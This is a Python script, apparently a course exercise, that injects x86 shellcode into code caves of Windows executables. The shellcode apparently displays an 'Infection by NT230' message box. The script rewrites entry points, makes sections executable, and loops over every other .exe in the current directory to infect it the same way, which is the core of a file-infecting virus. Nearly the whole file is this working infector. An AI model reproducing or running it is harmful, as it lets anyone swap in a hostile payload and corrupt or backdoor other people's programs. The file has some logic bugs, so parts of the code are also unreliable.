#!/usr/bin/env python3

import sys
import pefile
import argparse
import os
import ctypes
import subprocess

# CLI Argument Inputs
parser = argparse.ArgumentParser(description='Thiet PE file Injector')
parser.add_argument('--file','-f', dest='file', help='PE file to inject shellcode')

args = parser.parse_args()

# Identifies code cave of specified size (min shellcode + 20 padding)
# Returns the Virtual and Raw addresses
def FindCave():
    global pe
    filedata = open(args.file, "rb")
    print(" Min Cave Size: " + str(minCave) + " bytes")
    image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)
    caveFound = False
    for section in pe.sections:
        sectionCount = 0
        if section.SizeOfRawData != 0:
            position = 0
            count = 0
            filedata.seek(section.PointerToRawData, 0)
            while position < section.SizeOfRawData:
                byte = filedata.read(1)[0]
                position += 1
                if byte == 0x00:
                    count += 1
                else:
                    if count > minCave:
                        caveFound = True
                        raw_addr = section.PointerToRawData + position - count - 1
                        vir_addr = image_base_hex + section.VirtualAddress + position - count - 1
                        section.Characteristics = 0xE0000040
                        return vir_addr, raw_addr
                    count = 0
        sectionCount += 1
    filedata.close()

# Load file to var
file = args.file 

# Load to pefile object
pe = pefile.PE(file)

shellcode = bytes(
b""
b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31"
b"\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b"
b"\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3"
b"\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45"
b"\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
b"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31"
b"\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
b"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a"
b"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb"
b"\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
b"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec"
b"\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8"
b"\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
b"\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
b"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d"
b"\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x33"
b"\x30\x58\x20\x68\x20\x4e\x54\x32\x68\x6e\x20\x62"
b"\x79\x68\x63\x74\x69\x6f\x68\x49\x6e\x66\x65\x31"
b"\xdb\x88\x5c\x24\x12\x89\xe3\x68\x36\x33\x58\x20"
b"\x68\x35\x32\x31\x39\x68\x2d\x20\x32\x30\x68\x35"
b"\x39\x33\x20\x68\x30\x35\x32\x31\x68\x20\x2d\x20"
b"\x32\x68\x31\x39\x35\x37\x68\x32\x30\x35\x32\x31"
b"\xc9\x88\x4c\x24\x1e\x89\xe1\x31\xd2\x6a\x40\x53"
b"\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08"
)
  # Save file to variable
newFile = file
# Stores Image Base
image_base = pe.OPTIONAL_HEADER.ImageBase
minCave = (4 + len(shellcode)) + 10 #Do dai o trong

""" try:
    newEntryPoint, newRawOffset = FindCave()
except:
    sys.exit(" No Code Cave Found")

# Stores original entrypoint
origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint) 
# Sets new Entry Point and aligns address
pe.OPTIONAL_HEADER.AddressOfEntryPoint = newEntryPoint - image_base
returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')

# INJECT
shellcode += (b"\xB8" + returnAddress)
paddingBytes = b""

#Them padding vao sau Shellcode
if len(shellcode) % 4 != 0:
    paddingBytes = b"\x90" * 10
    shellcode += paddingBytes
shellcode += (b"\xFF\xD0")
#Them padding vao trước shellcode
shellcode = b"\x90\x90\x90\x90" + shellcode 

# Injects Shellcode
pe.set_bytes_at_offset(newRawOffset, shellcode)

# Save and close files
pe.write(newFile)

pe.close() """
 # Inject shellcode into other files in current directory
for filename in os.listdir('.'):
    if filename.endswith('.exe') and filename != file:
        try:
            print(f'Injecting {filename}...')
            pe = pefile.PE(filename)
            newFile = filename
            try:
                newEntryPoint, newRawOffset = FindCave()
            except:
                print(f'No Code Cave Found in {filename}')
                continue
            origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint) 
            pe.OPTIONAL_HEADER.AddressOfEntryPoint = newEntryPoint - image_base
            returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')
            shellcode += (b"\xB8" + returnAddress)
            if len(shellcode) % 4 != 0:
                paddingBytes = b"\x90" * 10
                shellcode += paddingBytes
            shellcode += (b"\xFF\xD0")
            shellcode = b"\x90\x90\x90\x90" + shellcode 
            pe.set_bytes_at_offset(newRawOffset, shellcode)
            pe.write(newFile)
            pe.close()
        except Exception as e:
            print(f'Error injecting {filename}: {e}')